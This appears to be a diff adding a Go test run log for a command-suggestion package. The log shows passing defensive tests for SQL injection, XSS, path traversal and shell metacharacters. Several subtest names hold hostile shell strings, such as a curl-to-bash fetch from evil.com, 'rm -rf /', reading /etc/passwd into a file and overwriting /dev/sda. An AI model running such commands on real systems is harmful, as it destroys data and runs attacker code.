@@ -1,0 +1,310 @@
+=== RUN   TestSecurity_SQLInjection_CommandText
+=== PAUSE TestSecurity_SQLInjection_CommandText
+=== NAME  
+=== RUN   TestSecurity_SQLInjection_SearchQuery
+=== PAUSE TestSecurity_SQLInjection_SearchQuery
+=== NAME  
+=== RUN   TestSecurity_ShellMetacharacters
+=== PAUSE TestSecurity_ShellMetacharacters
+=== NAME  
+=== RUN   TestSecurity_XSSPayloads
+=== PAUSE TestSecurity_XSSPayloads
+=== NAME  
+=== RUN   TestSecurity_MalformedUTF8
+=== PAUSE TestSecurity_MalformedUTF8
+=== NAME  
+=== RUN   TestSecurity_OversizedInput
+=== PAUSE TestSecurity_OversizedInput
+=== NAME  
+=== RUN   TestSecurity_NullByteInjection
+=== PAUSE TestSecurity_NullByteInjection
+=== NAME  
+=== RUN   TestSecurity_PathTraversal
+=== PAUSE TestSecurity_PathTraversal
+=== NAME  
+=== RUN   TestSecurity_SpecialSQLCharacters
+=== PAUSE TestSecurity_SpecialSQLCharacters
+=== NAME  
+=== RUN   TestSecurity_ConcurrentIngestion
+=== PAUSE TestSecurity_ConcurrentIngestion
+=== NAME  
+=== CONT  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_$(whoami)
+=== CONT  TestSecurity_ConcurrentIngestion
+=== CONT  TestSecurity_NullByteInjection
+=== CONT  TestSecurity_SQLInjection_SearchQuery
+--- PASS: TestSecurity_ShellMetacharacters/echo_$(whoami) (0.00s)
+=== CONT  TestSecurity_PathTraversal
+=== RUN   TestSecurity_NullByteInjection/null_byte
+=== RUN   TestSecurity_PathTraversal/traversal
+--- PASS: TestSecurity_NullByteInjection/null_byte (0.00s)
+=== CONT  TestSecurity_SQLInjection_CommandText
+=== CONT  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss
+=== CONT  TestSecurity_SpecialSQLCharacters
+=== CONT  TestSecurity_MalformedUTF8
+--- PASS: TestSecurity_XSSPayloads/xss (0.00s)
+=== CONT  TestSecurity_OversizedInput
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_OversizedInput/normalize_large
+=== RUN   TestSecurity_XSSPayloads/xss#01
+=== NAME  TestSecurity_NullByteInjection
+=== RUN   TestSecurity_NullByteInjection/null_byte#01
+--- PASS: TestSecurity_PathTraversal/traversal (0.00s)
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_PathTraversal/traversal#01
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_`whoami`
+--- PASS: TestSecurity_PathTraversal/traversal#01 (0.00s)
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_PathTraversal/traversal#02
+--- PASS: TestSecurity_NullByteInjection/null_byte#01 (0.00s)
+--- PASS: TestSecurity_ShellMetacharacters/echo_`whoami` (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/cat_/etc/passwd_>_/tmp/stolen
+--- PASS: TestSecurity_ShellMetacharacters/cat_/etc/passwd_>_/tmp/stolen (0.00s)
+=== NAME  TestSecurity_NullByteInjection
+=== RUN   TestSecurity_NullByteInjection/null_byte#02
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/cmd_&&_rm_-rf_/
+--- PASS: TestSecurity_OversizedInput/normalize_large (0.00s)
+=== NAME  TestSecurity_OversizedInput
+--- PASS: TestSecurity_ShellMetacharacters/cmd_&&_rm_-rf_/ (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_hello;_rm_-rf_/
+=== RUN   TestSecurity_OversizedInput/normalize_large#01
+--- PASS: TestSecurity_NullByteInjection/null_byte#02 (0.00s)
+=== NAME  TestSecurity_NullByteInjection
+--- PASS: TestSecurity_PathTraversal/traversal#02 (0.00s)
+=== RUN   TestSecurity_NullByteInjection/null_byte#03
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_PathTraversal/traversal#03
+--- PASS: TestSecurity_ShellMetacharacters/echo_hello;_rm_-rf_/ (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_${PATH}
+--- PASS: TestSecurity_ShellMetacharacters/echo_${PATH} (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/$(curl_http://evil.com/payload.sh_|_bash)
+--- PASS: TestSecurity_PathTraversal/traversal#03 (0.00s)
+--- PASS: TestSecurity_ShellMetacharacters/$(curl_http://evil.com/payload.sh_|_bash) (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/`curl_http://evil.com/payload.sh_|_bash`
+--- PASS: TestSecurity_NullByteInjection/null_byte#03 (0.00s)
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_PathTraversal/traversal#04
+=== NAME  TestSecurity_NullByteInjection
+=== RUN   TestSecurity_NullByteInjection/null_byte#04
+--- PASS: TestSecurity_ShellMetacharacters/`curl_http://evil.com/payload.sh_|_bash` (0.00s)
+--- PASS: TestSecurity_XSSPayloads/xss#01 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#02
+--- PASS: TestSecurity_PathTraversal/traversal#04 (0.00s)
+--- PASS: TestSecurity_XSSPayloads/xss#02 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#03
+=== NAME  TestSecurity_ShellMetacharacters
+--- PASS: TestSecurity_NullByteInjection/null_byte#04 (0.00s)
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_ShellMetacharacters/echo_hello_>_/dev/sda
+=== RUN   TestSecurity_PathTraversal/traversal#05
+=== NAME  TestSecurity_NullByteInjection
+--- PASS: TestSecurity_XSSPayloads/xss#03 (0.00s)
+=== RUN   TestSecurity_NullByteInjection/null_byte#05
+--- PASS: TestSecurity_NullByteInjection/null_byte#05 (0.00s)
+=== NAME  TestSecurity_NullByteInjection
+=== RUN   TestSecurity_NullByteInjection/null_byte#06
+--- PASS: TestSecurity_NullByteInjection/null_byte#06 (0.00s)
+--- PASS: TestSecurity_ShellMetacharacters/echo_hello_>_/dev/sda (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== NAME  TestSecurity_ShellMetacharacters
+=== NAME  TestSecurity_NullByteInjection
+=== RUN   TestSecurity_XSSPayloads/xss#04
+=== RUN   TestSecurity_ShellMetacharacters/echo_hello_>>_/etc/passwd
+--- PASS: TestSecurity_NullByteInjection (0.01s)
+--- PASS: TestSecurity_ShellMetacharacters/echo_hello_>>_/etc/passwd (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+--- PASS: TestSecurity_PathTraversal/traversal#05 (0.00s)
+--- PASS: TestSecurity_XSSPayloads/xss#04 (0.00s)
+=== RUN   TestSecurity_ShellMetacharacters/cmd_<_/dev/urandom
+--- PASS: TestSecurity_ShellMetacharacters/cmd_<_/dev/urandom (0.00s)
+=== NAME  TestSecurity_PathTraversal
+=== RUN   TestSecurity_PathTraversal/traversal#06
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#05
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_$((1+1))
+--- PASS: TestSecurity_ShellMetacharacters/echo_$((1+1)) (0.00s)
+--- PASS: TestSecurity_PathTraversal/traversal#06 (0.00s)
+=== NAME  TestSecurity_PathTraversal
+--- PASS: TestSecurity_PathTraversal (0.01s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_${HOME:-/root}
+--- PASS: TestSecurity_XSSPayloads/xss#05 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+--- PASS: TestSecurity_ShellMetacharacters/echo_${HOME:-/root} (0.00s)
+=== RUN   TestSecurity_XSSPayloads/xss#06
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_{a,b,c}
+--- PASS: TestSecurity_ShellMetacharacters/echo_{a,b,c} (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_~/../../etc/passwd
+--- PASS: TestSecurity_ShellMetacharacters/echo_~/../../etc/passwd (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_$'\x41\x42\x43'
+--- PASS: TestSecurity_ShellMetacharacters/echo_$'\x41\x42\x43' (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/cmd_2>&1
+--- PASS: TestSecurity_ShellMetacharacters/cmd_2>&1 (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/cmd_&>/dev/null
+--- PASS: TestSecurity_ShellMetacharacters/cmd_&>/dev/null (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/cmd_|&_tee_log
+--- PASS: TestSecurity_ShellMetacharacters/cmd_|&_tee_log (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+=== RUN   TestSecurity_ShellMetacharacters/echo_hello\nworld
+--- PASS: TestSecurity_ShellMetacharacters/echo_hello\nworld (0.00s)
+=== NAME  TestSecurity_ShellMetacharacters
+--- PASS: TestSecurity_ShellMetacharacters (0.01s)
+--- PASS: TestSecurity_OversizedInput/normalize_large#01 (0.01s)
+=== NAME  TestSecurity_OversizedInput
+=== RUN   TestSecurity_OversizedInput/normalize_large#02
+--- PASS: TestSecurity_XSSPayloads/xss#06 (0.01s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#07
+--- PASS: TestSecurity_XSSPayloads/xss#07 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#08
+--- PASS: TestSecurity_XSSPayloads/xss#08 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#09
+--- PASS: TestSecurity_XSSPayloads/xss#09 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+=== RUN   TestSecurity_XSSPayloads/xss#10
+--- PASS: TestSecurity_XSSPayloads/xss#10 (0.00s)
+=== NAME  TestSecurity_XSSPayloads
+--- PASS: TestSecurity_XSSPayloads (0.02s)
+=== RUN   TestSecurity_SQLInjection_SearchQuery/search_injection
+--- PASS: TestSecurity_SQLInjection_SearchQuery/search_injection (0.00s)
+=== NAME  TestSecurity_SQLInjection_SearchQuery
+=== RUN   TestSecurity_SQLInjection_SearchQuery/search_injection#01
+--- PASS: TestSecurity_SQLInjection_SearchQuery/search_injection#01 (0.00s)
+=== NAME  TestSecurity_SQLInjection_SearchQuery
+=== RUN   TestSecurity_SQLInjection_SearchQuery/search_injection#02
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars
+--- PASS: TestSecurity_SQLInjection_SearchQuery/search_injection#02 (0.00s)
+=== NAME  TestSecurity_SQLInjection_SearchQuery
+=== RUN   TestSecurity_SQLInjection_SearchQuery/search_injection#03
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8
+--- PASS: TestSecurity_SQLInjection_SearchQuery/search_injection#03 (0.01s)
+=== NAME  TestSecurity_SQLInjection_SearchQuery
+=== RUN   TestSecurity_SQLInjection_SearchQuery/search_injection#04
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8 (0.01s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#01
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#01
+=== RUN   TestSecurity_SQLInjection_CommandText/injection
+--- PASS: TestSecurity_SQLInjection_SearchQuery/search_injection#04 (0.00s)
+=== NAME  TestSecurity_SQLInjection_SearchQuery
+--- PASS: TestSecurity_SQLInjection_SearchQuery (0.10s)
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#01 (0.01s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#02
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#01 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#02
+--- PASS: TestSecurity_SQLInjection_CommandText/injection (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#01
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#02 (0.00s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#03
+--- PASS: TestSecurity_OversizedInput/normalize_large#02 (0.10s)
+=== NAME  TestSecurity_OversizedInput
+=== RUN   TestSecurity_OversizedInput/eventsize_large
+--- PASS: TestSecurity_OversizedInput/eventsize_large (0.00s)
+=== NAME  TestSecurity_OversizedInput
+=== RUN   TestSecurity_OversizedInput/eventsize_large#01
+--- PASS: TestSecurity_OversizedInput/eventsize_large#01 (0.00s)
+=== NAME  TestSecurity_OversizedInput
+=== RUN   TestSecurity_OversizedInput/eventsize_large#02
+--- PASS: TestSecurity_OversizedInput/eventsize_large#02 (0.00s)
+=== NAME  TestSecurity_OversizedInput
+--- PASS: TestSecurity_OversizedInput (0.11s)
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#02 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#03
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#03 (0.00s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#04
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#01 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#02
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#03 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#04
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#04 (0.00s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#05
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#02 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#03
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#05 (0.01s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#06
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#03 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#04
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#04 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#05
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#06 (0.01s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#07
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#07 (0.00s)
+=== NAME  TestSecurity_MalformedUTF8
+=== RUN   TestSecurity_MalformedUTF8/malformed_utf8#08
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#04 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#05
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#05 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#06
+--- PASS: TestSecurity_MalformedUTF8/malformed_utf8#08 (0.01s)
+=== NAME  TestSecurity_MalformedUTF8
+--- PASS: TestSecurity_MalformedUTF8 (0.14s)
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#06 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#07
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#05 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#06
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#07 (0.00s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#08
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#06 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#07
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#08 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#09
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#09 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+=== RUN   TestSecurity_SpecialSQLCharacters/special_sql_chars#10
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#07 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#08
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#08 (0.00s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+=== RUN   TestSecurity_SQLInjection_CommandText/injection#09
+--- PASS: TestSecurity_SpecialSQLCharacters/special_sql_chars#10 (0.01s)
+=== NAME  TestSecurity_SpecialSQLCharacters
+--- PASS: TestSecurity_SpecialSQLCharacters (0.16s)
+--- PASS: TestSecurity_ConcurrentIngestion (0.17s)
+--- PASS: TestSecurity_SQLInjection_CommandText/injection#09 (0.01s)
+=== NAME  TestSecurity_SQLInjection_CommandText
+--- PASS: TestSecurity_SQLInjection_CommandText (0.17s)
+PASS
+ok  	github.com/runger/clai/internal/suggestions	3.087s
